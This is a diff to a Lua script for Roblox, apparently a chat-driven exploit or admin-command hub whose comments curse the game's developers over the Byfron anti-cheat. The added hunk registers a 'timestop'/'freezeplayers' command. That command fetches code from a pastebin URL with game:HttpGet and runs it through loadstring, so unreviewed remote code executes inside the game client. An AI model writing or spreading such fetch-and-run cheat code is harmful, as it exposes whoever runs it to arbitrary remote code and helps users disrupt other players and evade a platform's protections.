@@ -633,7 +633,6 @@ kredits to whats the name
 
 
 
-
 --[[ MY KOMMANDS ]]--
 --[🍭🍭🍭🍭🍭🍭🍭🍭🍭🍭🍭🍭🍭]--
 cmd.add({"lollypop", "lollypophub", "lulas", "lh", "lula"}, {"LollypopHub (;lh, ;lulas, ;lula)", "exekute my skript(OP, big)"}, function()
@@ -1329,6 +1328,22 @@ print(Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
       Duration = 5;
       });
 end)
+
+cmd.add({"timestop", "ts", "freezeplayers", "freezeplrs"}, {"timestop (ts, freezeplayers, freezeplrs)", "kommandInfo"}, function()--timestopper/freezplrs
+loadstring(game:HttpGet('https://pastebin.com/raw/djAd7g2W'))()
+end)
+
+
+
+
+
+
+
+
+
+
+
+
 --[END OF MY 👺👺KOMMANDS]--
 
 
@@ -15783,7 +15798,7 @@ table.find({Enum.Platform.IOS, Enum.Platform.Android}, game:GetService("UserInpu
    end
  end)
 
- -- [[ CHAT TO USE COMMANDS ]] --
+ -- [[ XHAT TO USE KOMMANDS ]] --
  local function bindToChat(plr, msg)
    local chatMsg = chatExample:Clone()
    for i, v in pairs(chatLogs:GetChildren()) do
@@ -15876,6 +15891,5 @@ table.find({Enum.Platform.IOS, Enum.Platform.Android}, game:GetService("UserInpu
  end)
 
  --[[
-no kreds to devs  fuxk them for byfron 
-u 100% looked up keyword "byfron"
+no kreds to devs  fuxk them for byfron troll and made me have to remove it
 --]]
